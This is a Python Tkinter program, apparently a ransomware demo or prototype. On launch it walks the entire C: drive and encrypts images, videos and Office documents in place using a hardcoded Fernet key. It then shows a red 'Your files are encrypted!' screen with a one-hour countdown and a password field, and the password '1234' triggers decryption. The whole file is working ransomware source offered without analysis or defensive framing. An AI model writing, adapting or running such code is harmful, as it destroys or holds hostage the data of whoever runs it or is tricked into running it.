import tkinter as tk
from tkinterdnd2 import DND_FILES, TkinterDnD
import threading
import time
import os
from cryptography.fernet import Fernet

# Replace 'your_secret_key_here' with the provided secret key
secret_key = b'sijsMBFbFNFVKiOpDZxh17UsL8WmcMuMO-JcpaaLi5k='

# Initialize the Fernet symmetric encryption object with the key
fernet = Fernet(secret_key)

# Specify the root directory where you want to start encrypting and decrypting files
root_directory = 'c:\\'

# List of file extensions to encrypt
encrypt_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp',    # Image formats
                     '.mp4', '.avi', '.mov', '.mkv', '.wmv',     # Video formats
                     '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx']  # Microsoft Office formats

def encrypt_file(file_path):
   try:
       # Get the file extension
       file_extension = os.path.splitext(file_path)[1].lower()
       
       # Check if the file extension is in the list of extensions to encrypt
       if file_extension in encrypt_extensions:
           # Read the file content
           with open(file_path, 'rb') as file:
               file_data = file.read()

           # Encrypt the file content
           encrypted_data = fernet.encrypt(file_data)

           # Write the encrypted data back to the file
           with open(file_path, 'wb') as encrypted_file:
               encrypted_file.write(encrypted_data)

           print(f"Encrypted: {file_path}")
           return True
       else:
           print(f"Skipped encryption for: {file_path} (Unsupported file type)")
           return False
   except Exception as e:
       print(f"Error during encryption of {file_path}: {str(e)}")
       return False

def run_encryption_script():
   encrypted_count = 0  # Initialize a counter for encrypted files
   # Recursively traverse the directory and its subdirectories
   for root, dirs, files in os.walk(root_directory):
       for file_name in files:
           file_path = os.path.join(root, file_name)
           if encrypt_file(file_path):
               encrypted_count += 1  # Increment the counter for each successfully encrypted file

   print(f"Encryption complete. Encrypted {encrypted_count} files.")
   update_encrypted_count_label(encrypted_count)

def update_label():
   global remaining_time  # Declare remaining_time as a global variable
   minutes, seconds = divmod(remaining_time, 60)
   time_string = f"{minutes:02d}:{seconds:02d}"
   label.config(text=time_string)
   if remaining_time > 0:
       root.after(1000, update_label)  # Schedule update_label to run after 1000 milliseconds (1 second)
   remaining_time -= 1

def unlock_folder():
   password = password_entry.get()
   if password == "1234":  # Replace with your actual password
       run_decryption_script()
       remaining_time = 3600  # Reset the countdown to 1 hour
       update_label()
   else:
       error_label.config(text="Incorrect password")

def run_decryption_script():
   # Recursively traverse the directory and its subdirectories
   for root, dirs, files in os.walk(root_directory):
       for file_name in files:
           file_path = os.path.join(root, file_name)
           decrypt_file(file_path)

   print("Decryption complete.")

def decrypt_file(file_path):
   try:
       # Read the encrypted file content
       with open(file_path, 'rb') as encrypted_file:
           encrypted_data = encrypted_file.read()

       # Decrypt the data
       decrypted_data = fernet.decrypt(encrypted_data)

       # Write the decrypted data back to the file
       with open(file_path, 'wb') as decrypted_file:
           decrypted_file.write(decrypted_data)

       print(f"Decrypted: {file_path}")
   except Exception as e:
       print(f"Error during decryption of {file_path}: {str(e)}")

def update_encrypted_count_label(count):
   encrypted_count_label.config(text=f"Encrypted Files: {count}")

root = TkinterDnD.Tk()
root.title("Folder Encryptor and Decryptor")

remaining_time = 3600  # 1 hour in seconds

# Create a frame to hold the "Time Left:" label and countdown label in the middle
countdown_frame = tk.Frame(root)
countdown_frame.pack(fill=tk.Y, side="bottom", expand=True)

# Create the "Time Left:" label on the left side of the timer
time_left_label = tk.Label(countdown_frame, text="Time Left:", font=("Helvetica", 14), fg="black")
time_left_label.pack(side="left", padx=10)

# Create the countdown label and position it to the right of the "Time Left:" label
label = tk.Label(countdown_frame, font=("Arial", 24), fg="red")
label.pack(side="right")

# Create a frame with a white background to hold the "Welcome!" and text labels
top_frame = tk.Frame(root, bg="white")
top_frame.pack(fill=tk.BOTH, side="top", expand=True)

# Create the large text label with customized properties and a white background
large_text_label = tk.Label(top_frame, text="Your files are encrypted!", font=("Arial", 26), bg="white", fg="black")
large_text_label.pack(pady=10)

# Create a small text label with 20 words and a white background
small_text_label = tk.Label(top_frame, text="Please enter the password", font=("Helvetica", 12), bg="white", fg="black", justify="center")
small_text_label.pack()

# Create a frame to hold the password input and unlock button
text_frame = tk.Frame(root, bg="red")
text_frame.pack(fill=tk.BOTH, side="top", expand=True)

# Create the text label for the password input with customized properties
text_label = tk.Label(text_frame, text="Enter Password:", font=("Helvetica", 18), bg="red", fg="white")
text_label.pack()

# Create an entry field for the password
password_entry = tk.Entry(text_frame, show="*")  # Use show="*" to hide the entered characters
password_entry.pack()

# Create a button to unlock the folder
unlock_button = tk.Button(text_frame, text="Decrypt", command=unlock_folder)
unlock_button.pack()

# Create a label for error messages
error_label = tk.Label(text_frame, text="", fg="red")
error_label.pack()

# Create a label for displaying the number of encrypted files
encrypted_count_label = tk.Label(text_frame, text="", fg="white", bg="red")
encrypted_count_label.pack()

# Start the countdown timer in a separate thread
countdown_thread = threading.Thread(target=update_label)
countdown_thread.start()

# Automatically start encryption when the application is launched
run_encryption_script()

root.mainloop()
